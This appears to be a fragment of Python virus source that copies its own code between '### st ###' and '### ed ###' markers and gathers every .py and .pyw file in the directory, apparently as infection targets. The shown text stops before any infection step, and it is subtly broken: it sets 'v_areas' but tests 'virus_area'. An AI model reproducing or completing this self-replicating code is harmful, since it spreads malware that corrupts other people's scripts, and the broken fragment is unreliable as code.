### st ###

import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

v_areas = False
for line in lines:
    if line == '### st ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### ed ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

### ed ###